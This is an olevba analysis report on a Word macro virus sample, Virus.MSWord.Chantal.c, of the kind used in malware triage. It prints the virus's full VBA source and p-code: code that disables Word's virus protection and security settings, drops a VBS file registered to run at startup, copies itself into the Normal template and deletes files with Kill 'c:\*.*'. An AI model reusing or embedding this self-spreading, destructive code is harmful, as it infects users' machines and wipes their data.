olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Chantal.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Chantal.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()

'MK-Words 2
'From the MKVG - The Lion City
On Error Resume Next
Application.ShowVisualBasicEditor = False
CommandBars("Tools").Controls("macro").Enabled = False
Options.SaveNormalPrompt = False
Application.EnableCancelKey = False
Options.VirusProtection = False
DisableAutoMacros = False
Options.ConfirmConversions = False
ScreeenUpdate = False
ToolsOptionsSave.AutoSave = False
ToolsOptionsSave.GlobalDotPrompt = False
F = FreeFile
Open "c:\windows\system\mkv2.vbs" For Output As #F
Print #F, "Set MKV = WScript.CreateObject(" & Chr(34) & "Word.Application" & Chr(34) & ")"
Print #F, "MKV.Options.VirusProtection = False"
Print #F, "MKV.Options.SaveNormalPrompt = False"
Print #F, "MKV.Options.SaveNormalPrompt = False"
Print #F, "MKV.normaltemplate.vbproject.vbcomponents(1).codemodule.DeleteLines 1, MKV.normaltemplate.vbproject.vbcomponents(1).codemodule.CountOfLines"
Print #F, "MKV.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromFile (" & Chr(34) & "C:\WINDOWS\MKV4.vxd" & Chr(34) & ")"
Print #F, "MKV.Application.Quit"
Close #F

System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "MKV") = "C:\WINDOWS\SYSTEM\MKV2.vbs"
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
    CommandBars("Macro").Controls("Security...").Enabled = False
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
End If
If Year(Now) = 2000 Then Kill "c:\*.*": Kill "*.*": MsgBox "Welcome To Y2K", 0, "MK Words V2 By MKVG 1999"
If Day(Now) = 31 Then
Assistant.Visible = True
With Assistant.NewBalloon
    .Animation = msoAnimationListensToComputer
    .Button = msoButtonSetOK
    .Heading = "MK Words V.2"
    .Text = "Y2K is Coming Soon..."
    .Show
End With
End If

    If Not ActiveDocument.VBProject.VBComponents(1).CodeModule.Find("Document_Open", 1, 1, 1000, 1000, False, False) Then
        For I = 1 To NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
            lineofcode = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(I, 1)
            ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines I * 2, lineofcode
         Next I
        ' Save it
        If (Not ActiveDocument.ReadOnly) Then
            ActiveDocument.SaveAs AddToRecentFiles:=False
        End If
        
            
    ElseIf Not NormalTemplate.VBProject.VBComponents(1).CodeModule.Find("Document_Open", 1, 1, 1000, 1000, False, False) Then
            For I = 1 To ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
                lineofcode = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(I, 1)
                NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines I * 2, lineofcode
            Next I
            ' Save It
            NormalTemplate.Save
    Else
        'If the normal and active are infected now activate the payload
    End If
  
Y2KEnd:
        With Dialogs(wdDialogFileSummaryInfo)
            .Comments = "MK-Words (V2) By MMK 1999"
            .Execute
        End With

' MKVG had present MK Words Version 2
' (C) May 1999
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Chantal.c
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 5771 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' Line #2:
' 	QuoteRem 0x0000 0x000A "MK-Words 2"
' Line #3:
' 	QuoteRem 0x0000 0x001D "From the MKVG - The Lion City"
' Line #4:
' 	OnError (Resume Next) 
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #6:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #8:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #9:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #10:
' 	LitVarSpecial (False)
' 	St DisableAutoMacros 
' Line #11:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #12:
' 	LitVarSpecial (False)
' 	St ScreeenUpdate 
' Line #13:
' 	LitVarSpecial (False)
' 	Ld ToolsOptionsSave 
' 	MemSt AutoSave 
' Line #14:
' 	LitVarSpecial (False)
' 	Ld ToolsOptionsSave 
' 	MemSt GlobalDotPrompt 
' Line #15:
' 	Ld Friend 
' 	St False 
' Line #16:
' 	LitStr 0x001A "c:\windows\system\mkv2.vbs"
' 	Ld False 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #17:
' 	Ld False 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001F "Set MKV = WScript.CreateObject("
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0010 "Word.Application"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	PrintItemNL 
' Line #18:
' 	Ld False 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0023 "MKV.Options.VirusProtection = False"
' 	PrintItemNL 
' Line #19:
' 	Ld False 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0024 "MKV.Options.SaveNormalPrompt = False"
' 	PrintItemNL 
' Line #20:
' 	Ld False 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0024 "MKV.Options.SaveNormalPrompt = False"
' 	PrintItemNL 
' Line #21:
' 	Ld False 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x008B "MKV.normaltemplate.vbproject.vbcomponents(1).codemodule.DeleteLines 1, MKV.normaltemplate.vbproject.vbcomponents(1).codemodule.CountOfLines"
' 	PrintItemNL 
' Line #22:
' 	Ld False 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x004A "MKV.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromFile ("
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0013 "C:\WINDOWS\MKV4.vxd"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	PrintItemNL 
' Line #23:
' 	Ld False 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "MKV.Application.Quit"
' 	PrintItemNL 
' Line #24:
' 	Ld False 
' 	Sharp 
' 	Close 0x0001 
' Line #25:
' Line #26:
' 	LitStr 0x001A "C:\WINDOWS\SYSTEM\MKV2.vbs"
' 	LitStr 0x0000 ""
' 	LitStr 0x0040 "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"
' 	LitStr 0x0003 "MKV"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #27:
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #28:
' 	LitVarSpecial (False)
' 	LitStr 0x000B "Security..."
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #29:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #30:
' 	EndIfBlock 
' Line #31:
' 	Ld Now 
' 	ArgsLd Year 0x0001 
' 	LitDI2 0x07D0 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0006 "c:\*.*"
' 	ArgsCall Kill 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0003 "*.*"
' 	ArgsCall Kill 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x000E "Welcome To Y2K"
' 	LitDI2 0x0000 
' 	LitStr 0x0018 "MK Words V2 By MKVG 1999"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #32:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x001F 
' 	Eq 
' 	IfBlock 
' Line #33:
' 	LitVarSpecial (True)
' 	Ld Assistant 
' 	MemSt Visible 
' Line #34:
' 	StartWithExpr 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	With 
' Line #35:
' 	Ld msoAnimationListensToComputer 
' 	MemStWith Animation 
' Line #36:
' 	Ld msoButtonSetOK 
' 	MemStWith Button 
' Line #37:
' 	LitStr 0x000C "MK Words V.2"
' 	MemStWith Heading 
' Line #38:
' 	LitStr 0x0015 "Y2K is Coming Soon..."
' 	MemStWith Then 
' Line #39:
' 	ArgsMemCallWith Show 0x0000 
' Line #40:
' 	EndWith 
' Line #41:
' 	EndIfBlock 
' Line #42:
' Line #43:
' 	LitStr 0x000D "Document_Open"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x03E8 
' 	LitDI2 0x03E8 
' 	LitVarSpecial (False)
' 	LitVarSpecial (False)
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0007 
' 	Not 
' 	IfBlock 
' Line #44:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #45:
' 	Ld I 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St lineofcode 
' Line #46:
' 	Ld I 
' 	LitDI2 0x0002 
' 	Mul 
' 	Ld lineofcode 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #47:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #48:
' 	QuoteRem 0x0008 0x0008 " Save it"
' Line #49:
' 	Ld ActiveDocument 
' 	MemLd ReadOnly 
' 	Not 
' 	Paren 
' 	IfBlock 
' Line #50:
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #51:
' 	EndIfBlock 
' Line #52:
' Line #53:
' Line #54:
' 	LitStr 0x000D "Document_Open"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x03E8 
' 	LitDI2 0x03E8 
' 	LitVarSpecial (False)
' 	LitVarSpecial (False)
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0007 
' 	Not 
' 	ElseIfBlock 
' Line #55:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #56:
' 	Ld I 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St lineofcode 
' Line #57:
' 	Ld I 
' 	LitDI2 0x0002 
' 	Mul 
' 	Ld lineofcode 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #58:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #59:
' 	QuoteRem 0x000C 0x0008 " Save It"
' Line #60:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #61:
' 	ElseBlock 
' Line #62:
' 	QuoteRem 0x0008 0x003E "If the normal and active are infected now activate the payload"
' Line #63:
' 	EndIfBlock 
' Line #64:
' Line #65:
' 	Label Y2KEnd 
' Line #66:
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #67:
' 	LitStr 0x0019 "MK-Words (V2) By MMK 1999"
' 	MemStWith Comments 
' Line #68:
' 	ArgsMemCallWith Execute 0x0000 
' Line #69:
' 	EndWith 
' Line #70:
' Line #71:
' 	QuoteRem 0x0000 0x0024 " MKVG had present MK Words Version 2"
' Line #72:
' 	QuoteRem 0x0000 0x000D " (C) May 1999"
' Line #73:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|vbproject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |mkv2.vbs            |Executable file name                         |
|IOC       |MKV2.vbs            |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

